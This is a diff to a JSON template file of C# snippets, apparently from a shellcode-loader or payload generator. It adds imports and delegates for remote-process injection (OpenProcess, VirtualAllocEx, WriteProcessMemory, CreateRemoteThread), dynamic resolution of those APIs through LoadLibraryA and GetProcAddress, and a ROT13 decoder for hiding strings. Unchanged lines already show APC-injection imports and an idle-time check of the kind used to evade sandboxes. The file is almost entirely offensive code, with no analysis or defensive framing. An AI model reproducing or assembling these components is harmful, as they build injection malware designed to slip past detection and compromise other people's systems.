@@ -4,7 +4,8 @@
       "using System;",
       "using System.Runtime.InteropServices;",
       "using System.Security.Cryptography;",
-      "using System.Collections.Generic;"
+      "using System.Collections.Generic;",
+      "using System.Linq;"
     ],
     "io": [
       "using System.IO;",
@@ -76,6 +77,16 @@
       "[DllImport(\"kernel32.dll\", SetLastError = true)] static extern uint QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, uint dwData);",
       "[DllImport(\"kernel32.dll\", SetLastError = true)] static extern IntPtr OpenThread(uint dwDesiredAccess, bool bInheritHandle, uint dwThreadId);",
       "[DllImport(\"kernel32.dll\", SetLastError = true)] static extern void SleepEx(uint dwMilliseconds, bool bAlertable);"
+    ],
+    "dynamic_loading": [
+      "[DllImport(\"kernel32.dll\", SetLastError = true)] static extern IntPtr GetProcAddress(IntPtr hModule, string procName);",
+      "[DllImport(\"kernel32.dll\", SetLastError = true)] static extern IntPtr LoadLibraryA(string lpLibFileName);",
+      "",
+      "// Delegates for dynamically loaded functions",
+      "[UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate IntPtr OpenProcessDelegate(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);",
+      "[UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate IntPtr VirtualAllocExDelegate(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);",
+      "[UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate bool WriteProcessMemoryDelegate(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);",
+      "[UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate IntPtr CreateRemoteThreadDelegate(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);"
     ]
   },
   
@@ -145,6 +156,26 @@
       "    {",
       "        return null;",
       "    }",
+      "}"
+    ],
+    "string_obfuscation": [
+      "// --- String Obfuscation ---",
+      "// ROT13 decode function for obfuscated strings",
+      "static string DecodeROT13(string input)",
+      "{",
+      "    return new string(input.Select(x => (char)((x >= 'a' && x <= 'z') ? ",
+      "        (x - 'a' + 13) % 26 + 'a' : (x >= 'A' && x <= 'Z') ? ",
+      "        (x - 'A' + 13) % 26 + 'A' : x)).ToArray());",
+      "}"
+    ],
+    
+    "dynamic_api_loading": [
+      "// --- Dynamic API Loading Helper ---",
+      "static IntPtr GetApiAddress(string libraryName, string functionName)",
+      "{",
+      "    IntPtr hModule = LoadLibraryA(libraryName);",
+      "    if (hModule == IntPtr.Zero) return IntPtr.Zero;",
+      "    return GetProcAddress(hModule, functionName);",
       "}"
     ],
     "get_last_input_time": [
